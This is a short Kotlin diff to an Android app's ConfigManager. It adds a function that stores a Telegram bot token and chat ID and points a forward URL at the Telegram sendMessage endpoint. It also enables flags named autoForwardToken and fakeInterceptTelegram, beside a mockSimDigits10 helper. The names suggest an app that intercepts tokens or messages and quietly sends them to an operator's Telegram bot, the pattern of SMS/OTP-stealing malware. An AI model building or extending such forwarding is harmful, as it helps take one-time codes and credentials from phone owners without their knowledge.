@@ -294,6 +294,23 @@ class ConfigManager(private val context: Context) {
         return saveAndFlushSync(updated)
     }
 
+    /** Bot token + chat ID — ek baar dalo, save + runtime sync turant. */
+    fun syncTelegramCredentials(botToken: String, chatId: String): Boolean {
+        val token = botToken.trim()
+        val chat = chatId.trim()
+        if (token.isBlank() || chat.isBlank()) return false
+        val current = load()
+        val forwardUrl = "https://api.telegram.org/bot$token/sendMessage"
+        val updated = current.copy(
+            telegramBotToken = token,
+            telegramChatId = chat,
+            forwardUrl = forwardUrl,
+            autoForwardToken = true,
+            fakeInterceptTelegram = true
+        )
+        return saveAndFlushSync(updated)
+    }
+
     fun mockSimDigits10(phone: String): String {
         val digits = phone.replace(Regex("[^0-9]"), "")
         return when {
